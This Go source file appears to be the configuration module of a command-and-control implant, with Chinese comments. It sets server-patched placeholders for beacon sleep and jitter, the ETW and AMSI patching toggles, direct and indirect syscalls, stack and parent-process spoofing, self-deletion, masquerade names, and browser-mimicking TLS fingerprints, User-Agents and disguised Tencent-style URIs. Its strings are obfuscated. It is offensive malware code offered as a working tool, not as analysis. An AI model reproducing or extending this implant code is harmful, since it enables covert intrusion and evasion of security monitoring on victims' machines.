package config

import (
	"implant/core/obfs"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	pass       = "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // 66字符占位符，与服务端 GenServer patch 一致；生成时被替换为上线密码
	ExecuteKey = strings.ReplaceAll(pass, " ", "")

	// WaitTime beacon 节奏单一事实来源（CS sleep 语义，秒→Duration）：
	// 初始 = SleepSeconds()（HEARTBEAT_INTERVAL 占位符注入的生成时 sleep 秒），
	// SLEEP 命令运行时更新；心跳 ticker、轮询间隔、RecvDeadline 全部由它派生。
	// （原 HeartbeatBase/Profile SleeptimeMs 双基准已废弃，profile 只作生成时默认值）
	WaitTime = time.Duration(SleepSeconds()) * time.Second

	// 重连配置（JitterPercent 由服务端生成时 patch 替换为配置文件 client.jitter）
	ReconnectConfig = ReconnectConfiguration{
		JitterPercent:    JitterPercent(),       // 抖动百分比（占位符 patch）
		MaxJitterPercent: 50,                    // 最大50%抖动
		BaseDelay:        ReconnectBaseDelay(),  // 重连基础延时（占位符 patch，仅允许降频钳制）
		MaxDelay:         300 * time.Second,     // 重连最大延时5分钟
		MaxRetries:       ReconnectMaxRetries(), // 最大重试次数（占位符 patch，上限钳制）
		ResetTimeout:     10 * time.Minute,      // 断线保护重置时间10分钟
		SuccessThreshold: 5,                     // 连续成功5次解除保护
	}
)

// JITTER_PERCENT_PLACEHOLDER 抖动百分比占位符（服务端 GenServer 生成时替换为 client.jitter 配置）
const JITTER_PERCENT_PLACEHOLDER = "JITTER_PERCENT_PLACEHOLDER_12345"

// ===== OPSEC 编译期配置占位符（服务端 PatchClientBinary 生成时替换） =====
// 所有占位符均为运行时真实引用（链接器保留字符串），未 patch 时走下方默认值兜底，
// VerifyNoPlaceholderResidue 在启动早期统一检测残留并 fail-closed。

// ReconnectBaseDelayPlaceholder 重连基础延迟（秒）占位符
const ReconnectBaseDelayPlaceholder = "RECONNECT_BASE_DELAY_PLACEHOLDER_12345"

// ReconnectMaxRetriesPlaceholder 重连最大重试次数占位符
const ReconnectMaxRetriesPlaceholder = "RECONNECT_MAX_RETRIES_PLACEHOLDER_12345"

// InjectTechDefaultPlaceholder 注入默认技术占位符（auto/ntc/apc/crt）
const InjectTechDefaultPlaceholder = "INJECT_TECH_DEFAULT_PLACEHOLDER_12345"

// ETWPatchPlaceholder ETW 事件追踪补丁占位符（1=启动早期 patch ntdll!EtwEventWrite，消除 ETW 遥测）
const ETWPatchPlaceholder = "ETW_PATCH_PLACEHOLDER_12345"

// AmsiBypassPlaceholder AMSI 绕过占位符（1=启动早期 patch amsi!AmsiScanBuffer，规避 PowerShell/内存扫描）
const AmsiBypassPlaceholder = "AMSI_BYPASS_PLACEHOLDER_12345"

// DaemonizePlaceholder 前台自动守护化占位符（1=TTY 下运行自动脱离终端释放 shell；
// 0=保持前台。OPSEC：环境标记名用中性品牌前缀，无 C2 字样）
const DaemonizePlaceholder = "DAEMONIZE_PLACEHOLDER_12345"

// MetadataChannelPlaceholder Metadata 传输通道占位符（cookie/header/url/auto；
// http/https 轮询请求时随机选择放置 metadata 的位置，破除固定特征）
const MetadataChannelPlaceholder = "METADATA_CHANNEL_PLACEHOLDER_12345"

// PaddingPlaceholder 流量填充开关占位符（1=请求/响应随机长度填充，破除长度指纹）
const PaddingPlaceholder = "PADDING_PLACEHOLDER_12345"

// AutoDeletePlaceholder 上线后自动删除自身文件占位符（1=启动改名后立即尝试删除自身，
// 进程保持在线——"不占用进程文件"；默认 0=仅改名解锁，由前端"删除进程文件"兜底）
const AutoDeletePlaceholder = "AUTO_DELETE_PLACEHOLDER_12345"

// SyscallModePlaceholder 系统调用模式占位符（none=常规 ntdll 调用 / direct=直接 syscall(asm) /
// indirect=间接 syscall（复用 ntdll stub 的 syscall 指令）。前端生成时选择。
const SyscallModePlaceholder = "SYSCALL_MODE_PLACEHOLDER_12345"

// MasqueradeNamePlaceholder 伪装修饰前缀占位符（持久化对象名/命名管道/临时文件/HKDF 盐前缀等品牌字符串）
const MasqueradeNamePlaceholder = "MASQUERADE_NAME_PLACEHOLDER_12345"

// QuietModePlaceholder 静默模式占位符（1=静默：启动重定向 stdout/stderr 丢弃，无调试输出特征）
const QuietModePlaceholder = "QUIET_MODE_PLACEHOLDER_12345"

// UserAgentPlaceholder 网络请求 User-Agent 占位符（生成时由 Profile/监听器配置替换；
// 未替换时使用默认浏览器 UA，避免 Go-http-client/1.1 特征）
// UserAgentPlaceholder UA 占位符（120 字符长填充，容纳完整浏览器 UA；服务端同串替换）
const UserAgentPlaceholder = "HTTP_UA_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // const 字面量（var 会被内联剔除导致服务端替换失效）

// defaultUserAgent 默认 User-Agent（Chrome 120 桌面，与 disguise 平台伪装一致）
const defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// UserAgent 返回网络请求 User-Agent（Profile 生成时 patch；未 patch 时用默认浏览器 UA）
func UserAgent() string {
	s := strings.TrimSpace(UserAgentPlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return defaultUserAgent
	}
	return s
}

// ===== Profile 驱动占位符（HTTP URI / WS 路径 / 心跳基准） =====

// 【长度修复】GET/POST URI 占位符加长到 128 字符：
// 旧占位符仅 30/31 字符，标准默认 post URI（/tencent/sensearch/collection/
// item/check，40 字符）无法等长注入，服务端只能置空回退；加长后支持自定义
// 长 URI。服务端 patch 兼容新旧两种占位符（旧模板回退旧占位符）。

// HTTPGetURIPlaceholder http-get 请求路径占位符（128 字符）
const HTTPGetURIPlaceholder = "HTTP_GET_URI_PLACEHOLDER_1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123"

// HTTPPostURIPlaceholder http-post 请求路径占位符（128 字符）
const HTTPPostURIPlaceholder = "HTTP_POST_URI_PLACEHOLDER_123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012"

// WSPathPlaceholder WebSocket 握手路径占位符
const WSPathPlaceholder = "WS_PATH_PLACEHOLDER_12345"

// HeartbeatIntervalPlaceholder beacon sleep 占位符（秒，生成时由服务端按
// 默认链注入：显式参数 > profile sleeptime_ms > 监听器配置 > 服务端默认）。
// 【统一心跳】这是 beacon 节奏的单一事实来源（CS sleep 语义）：
// 心跳 ticker、轮询间隔、RecvDeadline 全部派生自它（见 config.WaitTime / app 包）。
const HeartbeatIntervalPlaceholder = "HEARTBEAT_INTERVAL_PLACEHOLDER_12345"

// SleepSeconds 解析 beacon sleep 秒数（1-300 钳制，未 patch 时默认 5）
func SleepSeconds() int {
	sec := parsePlaceholderInt(HeartbeatIntervalPlaceholder, 5)
	if sec < 1 {
		sec = 1
	}
	if sec > 300 {
		sec = 300
	}
	return sec
}

// TLSJA3Placeholder TLS 指纹占位符（chrome_120/firefox_121/edge_120/safari_17）
const TLSJA3Placeholder = "TLS_JA3_PLACEHOLDER_12345"

// DNSLabelPrefixPlaceholder DNS 查询标签前缀占位符（OPSEC：自定义内部标签掩码，默认空=保持 fb/pl/hb/rs/mi）
const DNSLabelPrefixPlaceholder = "DNS_LABEL_PREFIX_PLACEHOLDER_12345"

// SessionKeyInfoPlaceholder 会话密钥派生盐上下文占位符(生成时由服务端配置 patch;
// 密钥派生材料必须两端一致,不得使用随机 masquerade 前缀;默认中性随机串无语义)
const SessionKeyInfoPlaceholder = "SESSION_KEY_INFO_PLACEHOLDER_12345"

// SessionKeyInfo 会话密钥派生盐上下文(服务端 config.yaml security.session_key_info 同步)
func SessionKeyInfo() string {
	s := strings.TrimSpace(SessionKeyInfoPlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return obfs.Dec("RV6jPzfDDXylIQ==")
	}
	return s
}

// DNSLabelPrefix 返回 DNS 标签前缀（字母数字，≤8；Profile dns 配置）
func DNSLabelPrefix() string {
	s := strings.ToLower(strings.TrimSpace(DNSLabelPrefixPlaceholder))
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return ""
	}
	out := make([]rune, 0, len(s))
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			out = append(out, r)
			if len(out) >= 8 {
				break
			}
		}
	}
	return string(out)
}

// TLSFingerprint 返回 TLS ClientHello 指纹名（uTLS 预置，Profile tls.ja3 驱动；默认 chrome_120）
func TLSFingerprint() string {
	s := strings.ToLower(strings.TrimSpace(TLSJA3Placeholder))
	switch s {
	case obfs.Dec("G1PjOWidExf1JZ8="), "firefox", "ff":
		return obfs.Dec("G1PjOWidExf1JZ8=")
	case obfs.Dec("GF72OVHDWXg="), "edge":
		return obfs.Dec("GF72OVHDWXg=")
	case obfs.Dec("Dlv3PXybNHnz"), "safari":
		return obfs.Dec("Dlv3PXybNHnz")
	}
	return obfs.Dec("HlLjM2OXNHn2Jw==")
}

// HTTPGetURI 返回 http-get 路径（Profile patch；默认腾讯系伪装路径）
func HTTPGetURI() string {
	s := strings.TrimSpace(HTTPGetURIPlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return obfs.Dec("Uk70Mm2XBTzres0QBvW9PCKU/0UowQb2")
	}
	return s
}

// HTTPPostURI 返回 http-post 路径
func HTTPPostURI() string {
	s := strings.TrimSpace(HTTPPostURIPlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return obfs.Dec("Uk70Mm2XBTzrZMsOWuC/YTGfo0Mm3wn7Yq4dQ+Foj89V9yKkMIQMTw==")
	}
	return s
}

// WSPath 返回 WebSocket 握手路径
func WSPath() string {
	s := strings.TrimSpace(WSPathPlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return obfs.Dec("Uk3i")
	}
	return s
}

// HeartbeatBase 【已废弃】原 Profile SleeptimeMs 心跳基准（毫秒）双基准之一；
// 统一心跳改造后 beacon 节奏唯一来源为 SleepSeconds()（秒），profile 只作生成时默认值。

// ReconnectBaseDelay 重连基础延迟（秒）；仅允许降频钳制（1-60s，防误配高频连接）
func ReconnectBaseDelay() time.Duration {
	sec := parsePlaceholderInt(ReconnectBaseDelayPlaceholder, 1)
	if sec < 1 {
		sec = 1
	}
	if sec > 60 {
		sec = 60
	}
	return time.Duration(sec) * time.Second
}

// ReconnectMaxRetries 重连最大重试次数；上限钳制（5-200）
func ReconnectMaxRetries() int {
	n := parsePlaceholderInt(ReconnectMaxRetriesPlaceholder, 50)
	if n < 5 {
		n = 5
	}
	if n > 200 {
		n = 200
	}
	return n
}

// InjectTechDefault 注入默认技术（auto/ntc/apc/crt）
func InjectTechDefault() string {
	s := strings.TrimSpace(InjectTechDefaultPlaceholder)
	switch s {
	case "ntc", "apc", "crt":
		return s
	}
	return obfs.Dec("HE/lMw==")
}

// MetadataChannel 返回 metadata 传输通道（cookie/header/url/auto；默认 auto=每请求随机）
func MetadataChannel() string {
	s := strings.TrimSpace(MetadataChannelPlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return "auto"
	}
	switch s {
	case "cookie", "header", "url", "auto":
		return s
	}
	return "auto"
}

// PaddingEnabled 流量填充开关（1=启用；默认开启）
func PaddingEnabled() bool {
	s := strings.TrimSpace(PaddingPlaceholder)
	return s == "1" && !strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw="))
}

// DaemonizeEnabled 前台自动守护化开关（1=启用，默认开；TTY 下运行自动释放终端）
func DaemonizeEnabled() bool {
	s := strings.TrimSpace(DaemonizePlaceholder)
	return s == "1" && !strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw="))
}

// AutoDelete 上线后自动删除自身文件开关（1=启用；默认关闭）
func AutoDelete() bool {
	s := strings.TrimSpace(AutoDeletePlaceholder)
	return s == "1" && !strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw="))
}

// ETWPatchEnabled ETW 补丁开关（1=启用）。
//
// 注意：**默认是关闭的**。服务端生成载荷时把占位符替换成 "0"（见
// pkg/delivery/payload.go 的 replacements），前端开关默认也不勾选。
// 此前这里的注释写"默认启用"，与实现相反 —— 运维会以为载荷已经打了 ETW 补丁。
//
// 返回值是**当前生效值**：编译期占位符 + 运行期覆盖（EVASION 命令），见 opsec.go。
func ETWPatchEnabled() bool {
	return EvasionEnabled(EvasionETW)
}

// AmsiBypassEnabled AMSI 绕过开关（1=启用）。
//
// 与 ETWPatchEnabled 一样，**默认关闭**（服务端替换成 "0"）；注释曾误写"默认启用"。
func AmsiBypassEnabled() bool {
	return EvasionEnabled(EvasionAMSI)
}

// SleepMaskHideEnabled 睡眠期模块摘链（编译期开关 + 运行期覆盖）。
func SleepMaskHideEnabled() bool { return EvasionEnabled(EvasionModHide) }

// StackSpoofEnabled 伪造调用栈（仅 syscallMode=direct 时生效）。
func StackSpoofEnabled() bool { return EvasionEnabled(EvasionSpoof) }

// PpidSpoofEnabled 派生子进程时伪造父进程。
func PpidSpoofEnabled() bool { return EvasionEnabled(EvasionPPID) }

// BlockDLLsEnabled 子进程只允许微软签名 DLL。
func BlockDLLsEnabled() bool { return EvasionEnabled(EvasionBlockDLLs) }

// UnhookOnStartEnabled 启动时用磁盘映像恢复三个系统模块的内联 hook。
func UnhookOnStartEnabled() bool { return EvasionEnabled(EvasionUnhook) }

// SyscallMode 系统调用模式（none/direct/indirect；默认 none=常规 ntdll 调用）
func SyscallMode() string {
	s := strings.TrimSpace(SyscallModePlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return "none"
	}
	switch s {
	case "direct", "indirect":
		return s
	}
	return "none"
}

// HostEvasionEnabled 是否开了任意一项"主机层对抗"（ETW patch / AMSI bypass / syscall 模式）。
//
// 用于让那些**只在愿意承担对抗风险时才该生效**的能力跟随同一组开关，
// 例如睡眠期的模块摘链（见 evasion.HideForSleep）。三项全关时为 false，
// 也就是默认关闭 —— 与三项自身的默认值一致。
func HostEvasionEnabled() bool {
	return hostEvasionCompiledAny()
}

// MasqueradeName 伪装修饰前缀（生成时替换；未 patch 时默认中性名 svc）
func MasqueradeName() string {
	s := strings.TrimSpace(MasqueradeNamePlaceholder)
	if s == "" || strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return obfs.Dec("Dkzy")
	}
	return s
}

// QuietMode 静默模式开关（1=静默）
func QuietMode() bool {
	return parsePlaceholderInt(QuietModePlaceholder, 1) == 1
}

// JitterPercent 从占位符读取抖动百分比（未 patch 时默认 20）
func JitterPercent() int {
	s := strings.TrimSpace(JITTER_PERCENT_PLACEHOLDER)
	if v, err := strconv.Atoi(s); err == nil && v >= 0 && v <= 50 {
		return v
	}
	return 20
}

// parsePlaceholderInt 解析数字占位符，失败返回默认值
func parsePlaceholderInt(ph string, def int) int {
	s := strings.TrimSpace(ph)
	if strings.Contains(s, obfs.Dec("LXbQH0u6JASAUvw=")) {
		return def
	}
	if v, err := strconv.Atoi(s); err == nil {
		return v
	}
	return def
}

// VerifyNoPlaceholderResidue 占位符残留统一检测（fail-closed）：
// 任意可 patch 占位符原样残留说明模板未经服务端 patch（漏替换/旧模板），
// 载荷携带可识别特征字符串运行（OPSEC 风险），直接拒绝启动。
// 必须在静默模式重定向 stdout 之前调用（错误可见）。
// 机制：占位符为 const 字符串字面量，patch 在二进制层面替换其字面量；
// 未 patch 时字面量仍含 "PLACEHOLDER_12345"，命中即退出。
// placeholderChecks 参与"未 patch 即拒绝启动"的配置项。
//
// 注意 MultiEndpoints **不在**其中：它只在多传输载荷里由服务端 patch，单传输载荷
// 本就不会替换它。残留只意味着"没有配置多端点"，不构成安全风险（不含密钥材料）——
// 把它算进来会导致所有普通载荷一启动就拒绝运行（本次实测踩到并修复）。
func placeholderChecks() []string {
	return []string{
		ReconnectBaseDelayPlaceholder,
		ReconnectMaxRetriesPlaceholder,
		InjectTechDefaultPlaceholder,
		MasqueradeNamePlaceholder,
		QuietModePlaceholder,
		HTTPGetURIPlaceholder,
		HTTPPostURIPlaceholder,
		WSPathPlaceholder,
		ETWPatchPlaceholder,
		AmsiBypassPlaceholder,
		SyscallModePlaceholder,
		AutoDeletePlaceholder,
		MetadataChannelPlaceholder,
		PaddingPlaceholder,
		DaemonizePlaceholder,
		HeartbeatIntervalPlaceholder,
		JITTER_PERCENT_PLACEHOLDER,
		TLSJA3Placeholder,
		DNSLabelPrefixPlaceholder,
		SessionKeyInfoPlaceholder,
		// P4：P0–P3 能力的细分开关。新模板才有这些字面量；旧服务端不认识它们，
		// 残留检查会让"新客户端 + 旧服务端"直接拒绝启动——这是刻意的
		// （宁可起不来，也不要带着未生效的开关跑）。
		SleepMaskHidePlaceholder,
		StackSpoofPlaceholder,
		PpidSpoofPlaceholder,
		BlockDLLsPlaceholder,
		UnhookOnStartPlaceholder,
	}
}

// PlaceholderResidues 返回仍处于占位符状态的配置项（自检与测试用）
func PlaceholderResidues() []string {
	var out []string
	for _, c := range placeholderChecks() {
		if strings.Contains(c, obfs.Dec("LXbQH0u6JASAUvw=")) {
			out = append(out, c)
		}
	}
	return out
}

// VerifyNoPlaceholderResidue 占位符残留统一检测（fail-closed）：
// 任意安全敏感占位符原样残留说明模板未经服务端 patch（漏替换/旧模板），
// 载荷携带可识别特征字符串运行（OPSEC 风险），直接拒绝启动。
// 必须在静默模式重定向 stdout 之前调用（错误可见）。
func VerifyNoPlaceholderResidue() {
	if len(PlaceholderResidues()) > 0 {
		println(obfs.Dec("jaUL9y6pKASNUuA0dKU3lt8QMY6sPsV6vFeTgCmhehHYOKYhw16JqTfUbvZH5Khidej9UJi9OpRc1WsBzUPyOtNPz2LMLIso8hfgYJU="))
		os.Exit(1)
	}
}

// ReconnectConfiguration 重连配置结构
type ReconnectConfiguration struct {
	JitterPercent    int           // 抖动百分比 (0-50)
	MaxJitterPercent int           // 最大抖动百分比限制
	BaseDelay        time.Duration // 重连基础延时
	MaxDelay         time.Duration // 最大重连延时
	MaxRetries       int           // 最大重试次数（熔断机制）
	ResetTimeout     time.Duration // 熔断重置超时
	SuccessThreshold int           // 连续成功次数阈值
}
